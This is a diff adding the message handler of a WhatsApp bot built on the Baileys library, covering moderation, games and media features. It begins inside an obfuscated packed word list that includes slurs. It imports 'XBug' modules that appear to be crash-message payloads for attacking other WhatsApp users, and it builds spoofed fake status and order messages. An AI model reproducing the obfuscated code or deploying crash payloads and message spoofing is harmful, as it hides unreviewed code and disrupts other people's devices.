z|randibaaz|muthbaaz|muthal|bolochoda|suarerbaccha|bokachoda|chutmarika|bhosdiwala|chutiya|gora|kala||madarchod|gandu|great|ape|lesbi|stupid|lesbicheck|greatcheck|Check|Character|Helpful|anyway|UwU||patient|Hearted|Kind|Simp||Obedient|Forgiving|Grumpy|Generous|Compassionate|nNama|handsomecheck||gurastick|bucin|lovestick|anjing|||dogestick|dogesticker|patrik|patricksticker|shinobu2|animehug|share_count|Shares|views_count||Mimetype|hentaivid|ganteng|sasuke|boruto|mojiemoji|fbemoji|maximum|igemoji|getAnimeWall4|animewallpaper2|nMedia|nDetail|animewallpaper||gambar|uploader3|stickmeme|stickermeme|nVideo|isAnimated|nswm|stickerwm2|take2|swm2|basicStat|fullStat|7500|host|minecraft|19132|nUses|mcquery|Chapter|Wattpad|nLink|desc|nDesc|nDate|MCPEDL|shader|player|nplayer|versi|nversi|nport|nip|indonesia|servers|minecraftpocket|nhttps|SERVER|MINECRAFT|icon|HappyMod|legend|mobile|dlink|Uploaded|Spiderman|movie|pintereststicker|pinstick|pinsticker|groupMembers|sequestrar|attachment|disposition|headers|HEAD|method|fetch|m4a|formattedSize|extension|SOUNDCLOUD|SoundCloud|scdl|Mime|MEDIAFIRE|invalid|provided|1045|cinematic|1065|1066|multicolor2|1009|skeleton2|972|ver|studios|1046|halloweem2|watercolor2|christmas2|1060|golden||1063|964|glue2|1003|harrpotter|921|1041|matrix2|882|881|thunder2|minute|about|making|1068|sliced|833|871|981|1076|936|975|876|874|879|985|1026|pornhub2|grafiti|1081|974|avengers|1029|cracked|880|box|980|991|beach|929|930|sparkle|932|939|dark|941|frosted|915|883|889|890|cake|856|858|862|cold|868|1005|holidays|winter|1023|broken|1073|1033|1036|1038|science|1040|glossy|creat|1042|1043|blue|1048|pipe|water|1053|sea|1055|1057|tree|1056|cane|rainbow2|groupRevokeInvite|resetgruplink|resetgclink|resetlink|revoke|resetlinkgrup|resetlinkgroup|resetlinkgc|orders|TIKTOK|nowm|tiktoknowm|rover|diatas|masukkan|atau|ini|dibawah|salah|Klik|Silahkan|Untuk|profilePic|ummadl|Detail|Coffee|dev|alexflipnote|coffe|kopi|Female|female|Male|male|kopel|kopel_|iamriz7|Waifu|Back|ytvideo|ytaudio|Viewers|ytplay|GIMAGE|cicak|kaori|snippet|arridho|fatih|Result|SECRET|fictious|916909xxxxx|cannot|spymessage|stiker|balas|toptt|toaud||tomp4|toimg||emojimix2|nDuration|sgif|stickergif|sis|Hello|aja|sendListMsg|BOT|MENU||CHANGE|sendContact|finally|python|bind|Testing|_CPU|Usage_|_Total|Usaage_|Memory||_NodeJS|freemem|RAM|nRuntime|_miliseconds_|_Second_|Response|memoryUsage|statusbot|botstatus|lanjut|terminate|mulai|Find|Are|nClick|deletemsg|nView|Messages|View|Access|added|registered|Save|Locked||bold|hashes|Command|65100|tupai|120|fps|vsbmc|aobmc|mc_mode|mci|mi_mode|minterpolate|overlap|512|win_size|cos|imag|real|afftfilt|areverse|22100|44500|acrusher|width_type||equalizer|presences|liston|listonline|Unknown|User|array|PERSONAL|contain|replied|serializeM|Broadcast|Created_|Only|blocked_|n_Your|Thank|REPORT|THE|del|groupInviteCode|response|linkgc|linkgroup|Status|YY||receiptTimestamp|readTimestamp|userReceipt|Mute||unmuted|muted||Inactive|graphics|sexual|access|means|enabled|work|safe|nNsfw|unlocked|not_announcement|Closed|announcement|This|Deleted|hapusvote|cekvote|dimulai|Handsome|_There|Style|endLimit|setgruppp|setgrouppp|setbotpp|groupUpdateDescription|setdesk|groupUpdateSubject|setsubject|Packname|changed|successfully|Exif|groupLeave|groupAcceptInvite|n_Thank|Request|Min|Fitur|req|Rate|dude|Boss|Patient|See|Ohhh|Dizzy|Cow|Holy|Try|Sorry|Bro|Difficult|Ummm|Whwre|somewhere|dont|jungle|moon|mars|mountain|Father|After|Day|Year|married|right|Thats|Could|Yes|virgin|she|Course|premime|buttonmaker|Going|Cieeee|Soulmate|soulmate|AGAIN|PLAY|n_Example|Win_|n_Means|fruit_|Information|second|medium|nUsage|Saying|missing|Fill|GuessTheSentence|GuessTheWord|above|artist|nArtist|link_song|fatiharridho|food|nOption|toUpperCase|AIUEO|aiueo|holoh|heleh|huluh|hilih|halah|hadiah|clear|Option|Click|hardwork|something|deserve|forget|nDont|nGitHub|nYouTube|sourcecode|cekbot|updatebot|cekupdate|out_|_Suit|menantang|PvP|SUIT|suit_|playing|challenging|nTag|_Who|myself|sebelumnya|yang|Selesaikan|damaged|exist|delttc|Waiting|admit|Partners|ttt|ttc|Afk|switch|doc6|doc5|doc4|doc3|doc2|doc1|flasmurf|flarun|fluming|flaming|nSERIES|Results|Didn|Canceled|nSuit|Players|Both|nRock|Rock|respective|dan|canceled|okay|ept|acc|admited|Typed|Turn|over|511|board|ended|parseInt|skip|riddle|blank|Quiz|Music|Song|mesg|mes|Player|Perfect|Give|Answered|Answers|findIndex|upsert|emit|append|WebMessageInfo|Just|nNOTE|another|Emoji|footerText|bhosdike|3EB0382EDBB2|stanzaId|1305080833|14169948404|aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk|ybdZlRjhY|TZzubVJ7lCAd1PIz3Qb0|P32GszzU5piUZ5HKluLD5h|64455|DXIECzjrSh3rmcoHN76M9k|TSSZu8gDEAPhp8vjdtJS|Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp|background|8000|expiryTimestamp|requestFrom|Twitter|youtu|Kicked|Will|nSorry|Virus|300|Mark|spammed|Somebody|3500|http|nOwner|RegExp|composing|autoTyping|recording|autoRecord|Runtime|visits|xyz|countapi|scheduled|Reseted|schedule|node|Private|blueBright|yellow|magenta|bgBlue|bgGreen|bgWhite|readMessages|isNaN|Lose|zLw|1bB4naFCSngM2LKO2NoP5RI7K|1W0XhfaAcDwc7xh1R8lca6Qg|scansSidecar|1610993486|602F3D69|3f57c1ba2fcab95f2c0bb475d72720ba|21427642_840952686474581_572788076332761430_n|7118|CyRY|sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG|vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc|1079|1080|height|28777|Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU||hZIVPLsI70nM|At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P|fakestatus|nEND|Mobile|ABLabel|waid|TEL|nFN|XL|nVERSION|BEGIN|vcard|displayName|contactMessage|floc|fvideo|inviteCode|1616169743|6288213840883|groupJid|groupInviteMessage|fgif|opus|codecs|ogg|sellerJid|orderTitle|surface|itemCount|orderMessage|ftroli|itsMe|decodeJid|messageContextInfo||exports|module|autostick|tebakan|lirik|kalimat|lontong_desk|lontong|05|night|exif2|writeExif|writeExifVid|videoToWebp|imageToWebp|fluent|imageToBase64|qrcodereader|unscreen|ephoto|telegraph|tod|mumaker|caliph|myfunc||getTime|formatDate|tanggal|smsg|scrape|perf_hooks|jsdom|JSDOM|execSync|spawn|xfarr|hxz|baileys|adiwajshing|generateWAMessageContent|BufferJSON|config|uncaughtException'.split('|'),0,{}))
+process.on('uncaughtException', console.error)
+require('./config')
+const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
+const fs = require('fs')
+const os = require('os')
+const util = require('util')
+const path = require('path')
+const hx = require('hxz-api')
+const axios = require('axios')
+const chalk = require('chalk')
+const yts = require('yt-search')
+const xfar = require('xfarr-api')
+const google = require('google-it')
+const { exec, spawn, execSync } = require("child_process")
+const moment = require('moment-timezone')
+const { JSDOM } = require('jsdom')
+const speed = require('performance-now')
+const { performance } = require('perf_hooks')
+const { Primbon } = require('scrape-primbon')
+const primbon = new Primbon()
+const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
+const fdl = require('caliph-api')
+const maker = require('mumaker')
+const { pinterest } = require('./lib/pinterest') 
+const request = require('request')
+const xeontod = require("tod-api")
+const { EmojiAPI } = require("emoji-api")
+const emoji = new EmojiAPI()
+const { TelegraPh } = require('./lib/telegraph')
+const { imgSuper } = require('./lib/ephoto')
+const { remove, unscreen } = require('./lib/removebg')
+const QrCode = require('qrcode-reader')
+const qrcode = require('qrcode')
+const qrcodereader = require('qrcode-reader') 
+const imageToBase64 = require('image-to-base64')
+const ffmpeg = require('fluent-ffmpeg')
+const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif, writeExifStc } = require('./lib/exif2')
+
+const ini_mark = `0@s.whatsapp.net`
+const ownernya = ownernomer + '@s.whatsapp.net'
+
+//TIME
+const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
+const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
+const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
+ if(time2 < "23:59:00"){
+var ucapanWaktu = 'Good night 🔖'
+ }
+ if(time2 < "19:00:00"){
+var ucapanWaktu = 'Good afternoon 🔖'
+ }
+ if(time2 < "18:00:00"){
+var ucapanWaktu = 'Good afternoon 🔖…'
+ }
+ if(time2 < "15:00:00"){
+var ucapanWaktu = 'Good afternoon 🔖'
+ }
+ if(time2 < "11:00:00"){
+var ucapanWaktu = 'Good morning 🔖„'
+ }
+ if(time2 < "05:00:00"){
+var ucapanWaktu = 'Good morning 🔖‰'
+ } 
+
+// read database
+let tebaklagu = db.data.game.tebaklagu = []
+let _family100 = db.data.game.family100 = []
+let kuismath = db.data.game.math = []
+let tebakgambar = db.data.game.tebakgambar = []
+let tebakkata = db.data.game.tebakkata = []
+let caklontong = db.data.game.lontong = []
+let caklontong_desk = db.data.game.lontong_desk = []
+let tebakkalimat = db.data.game.kalimat = []
+let tebaklirik = db.data.game.lirik = []
+let tebaktebakan = db.data.game.tebakan = []
+let vote = db.data.others.vote = []
+let _autostick = db.data.others.autostick = []
+let autosticker = db.data.others.autosticker = []
+let ntnsfw = db.data.others.nsfw = []
+let ntvirtex = db.data.others.ntvirtex = []
+let ntilinkytvid = db.data.others.ntilinkytvid = []
+let ntilinkytch = db.data.others.ntilinkytch = []
+let ntilinkig = db.data.others.ntilinkig = []
+let ntilinkfb = db.data.others.ntilinkfb = []
+let ntilinktt = db.data.others.ntilinktt = []
+let ntilinktg = db.data.others.ntilinktg = []
+let ntilinktwt = db.data.others.ntilinktwt = []
+let ntilinkall = db.data.others.ntilinkall = []
+let ntwame = db.data.others.ntwame = []
+let nttoxic = db.data.others.nttoxic = []
+let xeonysticker = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/sticker.json'))
+let xeonyaudio = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/audio.json'))
+let xeonyimage = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/image.json'))
+let xeonyvideo = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/video.json'))
+let bad = JSON.parse(fs.readFileSync('./src/toxic/bad.json'))
+const xeonannou = JSON.parse(fs.readFileSync('./database/anoucement.json'))
+xeonbugpic = fs.readFileSync('./XBug/xpic.jpeg')
+const { xeonbut2 } = require('./XBug/xeonbut2')
+const { xeonvirtex } = require('./XBug/xeonvirtex')
+const { xeonbutton } = require('./XBug/xeonbutton')
+const { xeonbrutal } = require('./XBug/xeonbrutal')
+
+module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
+    try {
+        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
+        var budy = (typeof m.text == 'string' ? m.text : '')
+        var prefix = prefa ? /^[🔖°🔖€¢Ï€Ã·Ã—🔖¶🔖ˆ†🔖£🔖¢🔖‚¬🔖¥🔖®🔖„¢+🔖œ“_=|~!?@#$%^&.🔖©^]/gi.test(body) ? body.match(/^[🔖°🔖€¢Ï€Ã·Ã—🔖¶🔖ˆ†🔖£🔖¢🔖‚¬🔖¥🔖®🔖„¢+🔖œ“_=|~!?@#$%^&.🔖©^]/gi)[0] : "" : prefa ?? global.prefix
+        const isCmd = body.startsWith(prefix)
+        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
+        const args = body.trim().split(/ +/).slice(1)
+        const pushname = m.pushName || "No Name"
+        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
+        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const itsMe = m.sender == botNumber ? true : false
+        const text = q = args.join(" ")
+        const quoted = m.quoted ? m.quoted : m
+        const mime = (quoted.msg || quoted).mimetype || ''
+        const isMedia = /image|video|sticker|audio/.test(mime)
+        const sender = m.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
+        const from = mek.key.remoteJid
+        const type = Object.keys(mek.message)[0]        
+        const content = JSON.stringify(mek.message)
+        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
+     
+         //media detect \\
+		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
+		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
+		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
+		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
+     
+        //hijack function
+        const ordermessage = (m.msg.xtype === 'conversation' && m.msg.message.conversation) ? m.msg.message.conversation : (m.msg.xtype == 'imageMessage') && m.msg.message.imageMessage.caption ? m.msg.message.imageMessage.caption : (m.msg.xtype == 'videoMessage') && m.msg.message.videoMessage.caption ? m.msg.message.videoMessage.caption : (m.msg.xtype == 'extendedTextMessage') && m.msg.message.extendedTextMessage.text.startsWith(prefix) ? m.msg.message.extendedTextMessage.text : (m.msg.xtype == 'buttonsResponseMessage') && m.msg.message.buttonsResponseMessage.selectedButtonId.startsWith(prefix) ? m.msg.message.buttonsResponseMessage.selectedButtonId : (m.msg.xtype == 'listResponseMessage') && m.msg.message.listResponseMessage.singleSelectReply.selectedRowId.startsWith(prefix) ? m.msg.message.listResponseMessage.singleSelectReply.selectedRowId : (m.msg.xtype == 'templateButtonReplyMessage') && m.msg.message.templateButtonReplyMessage.selectedId.startsWith(prefix) ? m.msg.message.templateButtonReplyMessage.selectedId : ''   
+        const order = ordermessage.slice(0).trim().split(/ +/).shift().toLowerCase()	   
+	 
+	    //Fake
+	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
+		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
+		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
+		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
+		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
+		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
+		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
+		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
+	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
+		
+        // Group
+        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
+        const groupName = m.isGroup ? groupMetadata.subject : ''
+        const participants = m.isGroup ? await groupMetadata.participants : ''
+        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
+    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
+    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
+    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
+        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
+        const isAutoStick = _autostick.includes(from)
+        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
+        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
+        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
+        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
+        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
+        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
+        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
+        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
+        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
+        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
+        const antiWame = m.isGroup ? ntwame.includes(from) : false
+        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
+        const sotoy = [
+		'🔖Š : 🔖’ : 🔖',
+		'🔖’ : 🔖”” : 🔖Š',
+		'🔖‡ : 🔖‡ : 🔖‡',
+		'🔖Š : 🔖‹ : 🔖””',
+		'🔖”” : 🔖’ : 🔖',
+		'🔖”” : 🔖’ : 🔖Š',
+        '🔖Š : 🔖‹ : 🔖””',		
+		'🔖 : 🔖’ : 🔖‹',
+		'🔖 : 🔖 : 🔖',
+		'🔖Š : 🔖’ : 🔖’',
+		'🔖”” : 🔖”” : 🔖‡',
+		'🔖Œ : 🔖’ : 🔖””',
+		'🔖 : 🔖”” : 🔖””',
+		'🔖Š : 🔖‹ : 🔖’',
+		'🔖‹ : 🔖‹ : 🔖Œ',
+		'🔖”” : 🔖”” : 🔖‡',
+		'🔖”” : 🔖 : 🔖‡',
+		'🔖”” : 🔖”” : 🔖””  Win',
+		'🔖’ : 🔖’ : 🔖’ Win',
+		'🔖Œ : 🔖Œ : 🔖Œ Lose'
+		]
+
+	try {
+            let isNumber = x => typeof x === 'number' && !isNaN(x)
+            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
+            let user = global.db.data.users[m.sender]
+            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
+            if (user) {
+                if (!isNumber(user.afkTime)) user.afkTime = -1
+                if (!('afkReason' in user)) user.afkReason = ''
+                if (!isNumber(user.limit)) user.limit = limitUser
+            } else global.db.data.users[m.sender] = {
+                afkTime: -1,
+                afkReason: '',
+                limit: limitUser,
+            }
+    
+            let chats = global.db.data.chats[m.chat]
+            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
+            if (chats) {
+                if (!('mute' in chats)) chats.mute = false
+                if (!('antilink' in chats)) chats.antilink = false
+            } else global.db.data.chats[m.chat] = {
+                mute: false,
+                antilink: false,
+            }
+		
+	    let setting = global.db.data.settings[botNumber]
+            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
+	    if (setting) {
+		if (!isNumber(setting.status)) setting.status = 0
+		if (!('autobio' in setting)) setting.autobio = false
+		if (!('templateImage' in setting)) setting.templateImage = true
+		if (!('templateVideo' in setting)) setting.templateVideo = false
+		if (!('templateGif' in setting)) setting.templateGif = false
+		if (!('templateMsg' in setting)) setting.templateMsg = false	
+	    } else global.db.data.settings[botNumber] = {
+		status: 0,
+		autobio: false,
+		templateImage: true,
+		templateVideo: false,
+		templateGif: false,
+		templateMsg: false,
+	    }
+	    
+        } catch (err) {
+            console.error(err)
+        }
+        
+        // Public & Self
+        if (!XeonBotInc.public) {
+            if (!m.key.fromMe) return
+}
+//randoming function
+function pickRandom(list) {
+return list[Math.floor(list.length * Math.random())]
+}
+//auto react all message
+XeonBotInc.sendMessage(m.chat, {
+          react: {
+            text: `${pickRandom(['🎠'])}`,
+            key: m.key,
+          }})
+          
+//chat counter
+        if (m.message) {
+            XeonBotInc.readMessages([m.key])
+            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
+        }
+
+	// reset limit every 12 hours
+        let cron = require('node-cron')
+        cron.schedule('00 12 * * *', () => {
+            let user = Object.keys(global.db.data.users)
+            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
+            for (let jid of user) global.db.data.users[jid].limit = limitUser
+            console.log('Reseted Limit')
+        }, {
+            scheduled: true,
+            timezone: "Asia/Kolkata"
+        })   
+        
+// total hit
+        global.hit = {}
+if (isCmd) {
+data = await fetchJson('https://api.countapi.xyz/hit/XeonBotInc-md/visits')
+jumlahcmd = `${data.value}`
+dataa = await fetchJson(`https://api.countapi.xyz/hit/XeonBotInc-md${moment.tz('Asia/Kolkata').format('DDMMYYYY')}/visits`)
+jumlahharian = `${dataa.value}`
+}
+	// auto set bio
+	if (db.data.settings[botNumber].autobio) {
+	    let setting = global.db.data.settings[botNumber]
+	    if (new Date() * 1 - setting.status > 1000) {
+		let uptime = await runtime(process.uptime())
+		await XeonBotInc.setStatus(`${XeonBotInc.user.name} | Runtime : ${runtime(uptime)}`)
+		setting.status = new Date() * 1
+	    }
+	}
+	
+  //auto recording all
+    if (global.autoRecord) { if (m.chat) { XeonBotInc.sendPresenceUpdate('recording', m.chat) }
+}
+//autotyper all
+  if (global.autoTyping) { if (m.chat) { XeonBotInc.sendPresenceUpdate('composing', m.chat) }
+}
+
+// Autosticker gc
+        if (isAutoSticker) {
+            if (/image/.test(mime) && !/webp/.test(mime)) {
+                let mediac = await quoted.download()
+                await XeonBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
+                console.log(`Auto sticker detected`)
+            } else if (/video/.test(mime)) {
+                if ((quoted.msg || quoted).seconds > 11) return
+                let mediac = await quoted.download()
+                await XeonBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
+            }
+        }
+        //Autosticker pc
+                if (isAutoStick) {
+            if (/image/.test(mime) && !/webp/.test(mime)) {
+                let mediac = await quoted.download()
+                await XeonBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
+                console.log(`Auto sticker detected`)
+            } else if (/video/.test(mime)) {
+                if ((quoted.msg || quoted).seconds > 11) return
+                let mediac = await quoted.download()
+                await XeonBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
+            }
+        }
+
+//anti bad words by xeon
+if (antiToxic)
+if (bad.includes(messagesD)) {
+tos = ['Hey, watch your mouth','Never been taught how to speak?','Stop being toxic my friend🔖¤¢','Dont be toxic🔖¦„']
+sin =  tos[Math.floor(Math.random() * (tos.length))]
+m.reply(sin)
+if (m.text) {
+bvl = `\`\`\`Bad Word Detected\`\`\`\n\nYou are using bad word but you are an admin that's why i won't kick you🔖˜‡`
+if (isAdmins) return reply(bvl)
+if (m.key.fromMe) return reply(bvl)
+if (isCreator) return reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`Bad Word Detected\`\`\`\n\n@${kice.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})}
+}
+	  // Anti Link
+        if (db.data.chats[m.chat].antilink) {
+        if (budy.match(`chat.whatsapp.com`)) {
+        kice = m.sender
+        m.reply(`\`\`\`Group Link Detected\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending link in this group`)
+        if (!isBotAdmins) return m.reply(`${mess.botAdmin}, to kick the person who send link`)
+        let gclink = (`https://chat.whatsapp.com/`+await XeonBotInc.groupInviteCode(m.chat))
+        let isLinkThisGc = new RegExp(gclink, 'i')
+        let isgclink = isLinkThisGc.test(m.text)
+        if (isgclink) return m.reply(`\`\`\`Group Link Detected\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`)
+        if (isAdmins) return m.reply(`\`\`\`Group Link Detected\`\`\`\n\nAdmin has sent a link, admin is free to post any link`)
+        if (isCreator) return m.reply(`\`\`\`Group Link Detected\`\`\`\n\nOwner has sent a link, owner is free to post any link`)
+        XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+        }
+        }
+          // Antiwame by xeon
+  if (antiWame)
+  if (budy.includes(`wa.me`)) {
+if (!isBotAdmins) return
+bvl = `\`\`\`Wa.me Link Detected\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link`
+if (isAdmins) return m.reply(bvl)
+if (m.key.fromMe) return m.reply(bvl)
+if (isCreator) return m.reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`Wa.me Link Detected\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+  if (antiWame)
+  if (budy.includes(`http://wa.me`)) {
+if (!isBotAdmins) return
+bvl = `\`\`\`Wa.me Link Detected\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link`
+if (isAdmins) return m.reply(bvl)
+if (m.key.fromMe) return m.reply(bvl)
+if (isCreator) return m.reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`Wa.me Link Detected\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antivirtex by xeon
+  if (antiVirtex) {
+  if (budy.length > 3500) {
+  m.reply(`Somebody spammed virus!! Mark as read\n`.repeat(300))
+  m.reply(`\`\`\`ã€Œ Virus Detected ã€\`\`\`\n\nSorry You Will Be Kicked !`)
+  if (!isBotAdmins) return m.reply(mess.botAdmin)
+  XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+  }
+  }
+//anti bad words by xeon
+if (antiToxic)
+if (bad.includes(messagesD)) {
+tos = ['Hey, watch your mouth','Never been taught how to speak?','Stop being toxic my friend🔖¤¢','Dont be toxic🔖¦„']
+sin =  tos[Math.floor(Math.random() * (tos.length))]
+m.reply(sin)
+if (m.text) {
+bvl = `\`\`\`ã€Œ Bad Word Detected ã€\`\`\`\n\nYou are using bad word but you are an admin that's why i won't kick you🔖˜‡`
+if (isAdmins) return m.reply(bvl)
+if (m.key.fromMe) return m.reply(bvl)
+if (isCreator) return m.reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
